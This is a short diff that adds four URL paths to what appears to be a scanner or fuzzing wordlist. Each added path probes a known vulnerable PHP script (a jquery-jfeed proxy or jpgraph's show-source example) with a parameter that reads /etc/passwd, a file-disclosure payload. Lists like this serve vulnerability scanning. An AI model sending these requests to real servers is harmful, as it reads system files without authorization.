@@ -1,1 +1,5 @@
 /services/getFile.cmd?userfile=config.xml
+/html/usr/share/javascript/jquery-jfeed/proxy.php%3furl=/etc/passwd&ooo
+/usr/share/javascript/jquery-jfeed/proxy.php%3furl=/etc/passwd&ooo
+/html/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php%3ftarget=/etc/passwd&ooo
+/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php%3ftarget=/etc/passwd&ooo
